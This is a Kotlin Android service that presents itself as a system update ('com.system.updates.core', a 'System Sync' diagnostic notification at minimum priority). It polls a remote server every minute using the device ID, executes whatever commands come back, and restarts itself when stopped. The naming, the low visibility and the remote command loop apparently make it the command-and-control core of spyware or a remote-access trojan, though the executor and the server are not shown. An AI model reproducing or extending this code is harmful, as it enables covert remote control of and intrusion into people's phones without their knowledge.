package com.system.updates.core

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import androidx.core.app.NotificationCompat
import androidx.work.*
import java.util.concurrent.TimeUnit

class BackgroundService : Service() {

    private val CHANNEL_ID = "SystemUpdateChannel"
    private val NOTIFICATION_ID = 1
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var checkCommandsRunnable: Runnable

    override fun onCreate() {
        super.onCreate()
        scheduleCleanup()
        startCommandListener()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification().build())

        intent?.getStringExtra("command")?.let { command ->
            executeCommand(command, intent)
        }

        return START_STICKY
    }

    private fun startCommandListener() {
        checkCommandsRunnable = object : Runnable {
            override fun run() {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
                NetUtils.fetchPendingCommands(deviceId) { command ->
                    if (command != null) {
                        executeCommand(command, null)
                    }
                }
                handler.postDelayed(this, 60000)
            }
        }
        handler.post(checkCommandsRunnable)
    }

    private fun executeCommand(command: String, intent: Intent?) {
        CommandExecutor.execute(this, command, intent)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Sync",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): NotificationCompat.Builder {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Sync")
            .setContentText("Running diagnostic service...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
    }

    private fun scheduleCleanup() {
        val cleanupRequest = PeriodicWorkRequestBuilder<AutoCleanupWorker>(6, TimeUnit.HOURS).build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "AutoCleanup",
            ExistingPeriodicWorkPolicy.KEEP,
            cleanupRequest
        )
    }

    override fun onDestroy() {
        handler.removeCallbacks(checkCommandsRunnable)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
